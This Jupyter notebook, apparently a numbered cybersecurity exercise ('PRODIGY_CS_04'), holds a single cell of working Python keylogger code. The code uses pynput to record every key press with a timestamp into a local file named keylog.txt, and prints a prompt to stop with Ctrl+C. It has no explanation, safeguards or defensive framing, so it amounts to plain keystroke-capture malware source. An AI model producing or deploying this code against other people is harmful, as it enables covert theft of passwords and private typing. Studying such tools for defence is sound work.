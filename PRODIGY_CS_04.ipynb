{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "2879536b",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Press Ctrl+C to stop logging.\n"
     ]
    }
   ],
   "source": [
    "from pynput import keyboard\n",
    "import time\n",
    "\n",
    "def on_key_press(key):\n",
    "    log_file = open(\"keylog.txt\", \"a\")\n",
    "    timestamp = time.strftime(\"%Y-%m-%d %H:%M:%S\", time.localtime())\n",
    "    log_file.write(f\"{timestamp} - {key}\\n\")\n",
    "    log_file.close()\n",
    "\n",
    "def main():\n",
    "    print(\"Press Ctrl+C to stop logging.\")\n",
    "    with keyboard.Listener(on_press=on_key_press) as listener:\n",
    "        listener.join()\n",
    "\n",
    "if __name__ == \"__main__\":\n",
    "    main()\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "f6cccb8b",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.11.5"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
